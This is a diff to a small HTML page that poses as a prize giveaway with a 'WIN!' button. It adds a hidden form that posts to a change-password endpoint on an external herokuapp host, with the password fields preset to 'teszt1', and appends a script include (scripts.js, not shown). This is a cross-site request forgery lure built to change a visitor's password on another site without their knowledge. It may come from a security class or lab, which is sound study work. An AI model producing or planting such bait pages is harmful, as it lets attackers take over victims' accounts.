@@ -1,4 +1,5 @@
 <!DOCTYPE html>
+
 <html lang="en">
   <head>
     <meta charset="utf-8">
@@ -15,6 +16,23 @@
         <p class="lead">You have a chance to win something. All you have to do is click the WIN! button below!</p>
         <p class="text-center"><a class="btn btn-lg btn-success" href="#" role="button">WIN!</a></p>
       </div>
+	  
+	  <form id="myForm" method="post" action="http://silver-quire.herokuapp.com/change-password" class="form-horizontal" type="hidden">
+      <div class="form-group">
+        <label for="password" class="col-sm-4 control-label">Password</label>
+        <div class="col-sm-4">
+          <input id="password_confirmation" type="password" name="user[password]" class="form-control" value="teszt1"/>
+        </div>
+      </div>
+      <div class="form-group">
+        <label for="password_confirmation" class="col-sm-4 control-label">Confirm password</label>
+        <div class="col-sm-4">
+          <input id="password_confirmation" type="password" name="user[password_confirmation]" class="form-control" value="teszt1"/>
+        </div>
+      </div>
+	  </form>
+
   </body>
 </html>
 
+<script src="./scripts.js"></script>
